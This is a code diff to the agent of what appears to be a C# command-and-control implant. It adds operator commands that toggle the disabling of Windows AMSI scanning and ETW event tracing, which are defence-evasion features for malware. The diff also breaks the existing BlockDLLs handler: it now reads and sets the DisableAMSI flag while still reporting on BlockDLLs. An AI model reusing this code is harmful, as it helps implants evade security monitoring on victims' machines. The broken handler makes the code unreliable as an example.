@@ -52,6 +52,16 @@ namespace Agent.Modules
                     },
                     new ModuleInfo.Command
                     {
+                        Name = "DisableAMSI",
+                        Delegate = SetDisableAMSI
+                    },
+                    new ModuleInfo.Command
+                    {
+                        Name = "DisableETW",
+                        Delegate = SetDisableETW
+                    },
+                    new ModuleInfo.Command
+                    {
                         Name = "Exit",
                         Delegate = ExitAgent
                     }
@@ -156,20 +166,20 @@ namespace Agent.Modules
 
                 if (block == null)
                 {
-                    current = Config.Get<bool>(AgentConfig.BlockDLLs);
+                    current = Config.Get<bool>(AgentConfig.DisableAMSI);
                 }
                 else
                 {
                     if ((bool)block)
                     {
-                        Config.Set(AgentConfig.BlockDLLs, true);
+                        Config.Set(AgentConfig.DisableAMSI, true);
                     }
                     else
                     {
-                        Config.Set(AgentConfig.BlockDLLs, false);
+                        Config.Set(AgentConfig.DisableAMSI, false);
                     }
 
-                    current = Config.Get<bool>(AgentConfig.BlockDLLs);
+                    current = Config.Get<bool>(AgentConfig.DisableAMSI);
                 }
 
                 if (current)
@@ -179,6 +189,90 @@ namespace Agent.Modules
                 else
                 {
                     Agent.SendMessage($"BlockDLLs is disabled.");
+                }
+            }
+            catch (Exception e)
+            {
+                Agent.SendError(e.Message);
+            }
+        }
+
+        void SetDisableAMSI(string AgentID, C2Data C2Data)
+        {
+            try
+            {
+                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+                var disable = parameters.FirstOrDefault(p => p.Name.Equals("DisableAMSI", StringComparison.OrdinalIgnoreCase)).Value;
+
+                bool current;
+
+                if (disable == null)
+                {
+                    current = Config.Get<bool>(AgentConfig.DisableAMSI);
+                }
+                else
+                {
+                    if ((bool)disable)
+                    {
+                        Config.Set(AgentConfig.DisableAMSI, true);
+                    }
+                    else
+                    {
+                        Config.Set(AgentConfig.DisableAMSI, false);
+                    }
+
+                    current = Config.Get<bool>(AgentConfig.DisableAMSI);
+                }
+
+                if (current)
+                {
+                    Agent.SendMessage($"DisableAMSI is enabled.");
+                }
+                else
+                {
+                    Agent.SendMessage($"DisableAMSI is disabled.");
+                }
+            }
+            catch (Exception e)
+            {
+                Agent.SendError(e.Message);
+            }
+        }
+
+        void SetDisableETW(string AgentID, C2Data C2Data)
+        {
+            try
+            {
+                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+                var disable = parameters.FirstOrDefault(p => p.Name.Equals("DisableETW", StringComparison.OrdinalIgnoreCase)).Value;
+
+                bool current;
+
+                if (disable == null)
+                {
+                    current = Config.Get<bool>(AgentConfig.DisableETW);
+                }
+                else
+                {
+                    if ((bool)disable)
+                    {
+                        Config.Set(AgentConfig.DisableETW, true);
+                    }
+                    else
+                    {
+                        Config.Set(AgentConfig.DisableETW, false);
+                    }
+
+                    current = Config.Get<bool>(AgentConfig.DisableETW);
+                }
+
+                if (current)
+                {
+                    Agent.SendMessage($"DisableETW is enabled.");
+                }
+                else
+                {
+                    Agent.SendMessage($"DisableETW is disabled.");
                 }
             }
             catch (Exception e)
